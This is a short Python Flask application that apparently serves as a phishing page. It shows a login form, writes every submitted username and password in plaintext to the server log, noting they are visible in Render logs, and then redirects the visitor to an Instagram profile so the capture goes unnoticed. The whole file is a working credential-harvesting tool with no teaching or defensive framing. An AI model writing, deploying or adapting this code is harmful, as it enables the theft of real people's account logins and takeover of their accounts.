from flask import Flask, render_template, request, redirect
import logging

app = Flask(__name__)

# Enable logging to capture login attempts
logging.basicConfig(level=logging.INFO)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Log credentials (visible in Render logs)
    app.logger.info(f"Login attempt - Username: {username}, Password: {password}")
    
    # Redirect to Instagram page
    return redirect("https://www.instagram.com/ex.clothi/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)



